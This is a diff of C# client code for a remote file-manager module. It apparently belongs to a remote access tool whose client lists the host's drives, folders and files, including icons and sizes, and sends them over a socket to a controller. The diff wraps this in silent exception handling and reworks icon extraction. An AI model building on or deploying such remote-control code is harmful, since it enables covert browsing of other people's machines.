@@ -15,45 +15,53 @@ namespace Client.Handle_Packet
     {
         public void GetDrivers()
         {
-            DriveInfo[] allDrives = DriveInfo.GetDrives();
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "fileManager";
-            msgpack.ForcePathObject("Command").AsString = "getDrivers";
-            StringBuilder sbDriver = new StringBuilder();
-            foreach (DriveInfo d in allDrives)
+            try
             {
-                if (d.IsReady)
+                DriveInfo[] allDrives = DriveInfo.GetDrives();
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                msgpack.ForcePathObject("Command").AsString = "getDrivers";
+                StringBuilder sbDriver = new StringBuilder();
+                foreach (DriveInfo d in allDrives)
                 {
-                    sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
+                    if (d.IsReady)
+                    {
+                        sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
+                    }
+                    msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
+                    ClientSocket.BeginSend(msgpack.Encode2Bytes());
                 }
-                msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
-                ClientSocket.BeginSend(msgpack.Encode2Bytes());
             }
+            catch { }
         }
 
         public void GetPath(string path)
         {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "fileManager";
-            msgpack.ForcePathObject("Command").AsString = "getPath";
-            StringBuilder sbFolder = new StringBuilder();
-            StringBuilder sbFile = new StringBuilder();
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                msgpack.ForcePathObject("Command").AsString = "getPath";
+                StringBuilder sbFolder = new StringBuilder();
+                StringBuilder sbFile = new StringBuilder();
 
-            foreach (string folder in Directory.GetDirectories(path))
-            {
-                sbFolder.Append(Path.GetFileName(folder) + "-=>" + Path.GetFullPath(folder) + "-=>");
-            }
-            foreach (string file in Directory.GetFiles(path))
-            {
-                using (MemoryStream ms = new MemoryStream())
+                foreach (string folder in Directory.GetDirectories(path))
                 {
-                    GetIcon(file).Save(ms, ImageFormat.Png);
-                    sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>" + new FileInfo(file).Length.ToString() + "-=>");
+                    sbFolder.Append(Path.GetFileName(folder) + "-=>" + Path.GetFullPath(folder) + "-=>");
                 }
+                foreach (string file in Directory.GetFiles(path))
+                {
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        GetIcon(file).Save(ms, ImageFormat.Png);
+                        sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>" + new FileInfo(file).Length.ToString() + "-=>");
+                    }
+                }
+                msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
+                msgpack.ForcePathObject("File").AsString = sbFile.ToString();
+                ClientSocket.BeginSend(msgpack.Encode2Bytes());
             }
-            msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
-            msgpack.ForcePathObject("File").AsString = sbFile.ToString();
-            ClientSocket.BeginSend(msgpack.Encode2Bytes());
+            catch { }
         }
 
         private Bitmap GetIcon(string file)
@@ -62,14 +70,16 @@ namespace Client.Handle_Packet
             {
                 if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") || file.EndsWith("bmp"))
                 {
-                    using (Image thumb = Image.FromFile(file).GetThumbnailImage(64, 64, () => false, IntPtr.Zero))
+                    using (Bitmap myBitmap = new Bitmap(file))
                     {
-                        return new Bitmap(thumb);
+                        return new Bitmap(myBitmap.GetThumbnailImage(64, 64, new Image.GetThumbnailImageAbort(() => false), IntPtr.Zero));
                     }
                 }
-                Icon icon = Icon.ExtractAssociatedIcon(file);
-                Bitmap bmpIcon = icon.ToBitmap();
-                return bmpIcon;
+                else
+                    using (Icon icon = Icon.ExtractAssociatedIcon(file))
+                    {
+                        return icon.ToBitmap();
+                    }
             }
             catch
             {
